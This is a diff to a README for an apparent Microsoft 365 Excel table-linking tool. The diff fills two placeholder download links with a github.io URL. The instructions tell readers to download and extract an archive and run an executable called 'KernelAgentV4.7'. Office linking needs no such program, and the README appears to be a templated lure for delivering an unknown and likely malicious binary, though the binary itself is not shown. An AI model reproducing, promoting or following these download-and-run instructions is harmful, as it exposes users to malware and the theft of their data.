@@ -2,13 +2,15 @@
 
 Link Excel tables and embed live, auto-updating data across Word, PowerPoint, and Outlook. This tool enables full Microsoft 365 integration for table linking and real-time data sync using KernelAgentV4.7.
 
-[![Download Excel Linking](https://img.shields.io/badge/Download-Excel_Linking_Tool-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Excel Linking](https://img.shields.io/badge/Download-Excel_Linking_Tool-blueviolet)](https://m365-excel-table-linking-embed.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-excel-table-linking-embed.github.io/.github
+) section  
 2. 📁 **Extract the folder** to a location like `C:\ExcelLinkingM365`  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to activate linking components  
 4. 📊 Open Word or PowerPoint → Insert → Object → Link from Excel  
